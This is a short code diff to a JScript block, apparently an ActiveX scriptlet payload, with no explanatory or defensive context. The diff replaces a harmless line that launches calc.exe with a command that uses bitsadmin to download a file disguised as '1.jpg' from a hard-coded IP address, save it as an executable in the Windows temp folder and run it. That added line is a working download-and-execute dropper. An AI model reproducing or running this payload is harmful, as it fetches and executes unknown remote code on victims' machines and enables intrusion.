@@ -13,7 +13,8 @@
 <script language="JScript">
 <![CDATA[
 
-		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+		var r = new ActiveXObject("WScript.Shell").Run("bitsadmin.exe /transfer n http://106.15.201.82/1.jpg c:\windows\temp\a.exe && c:\windows\temp\a.exe
+");
 	
 	
 ]]>
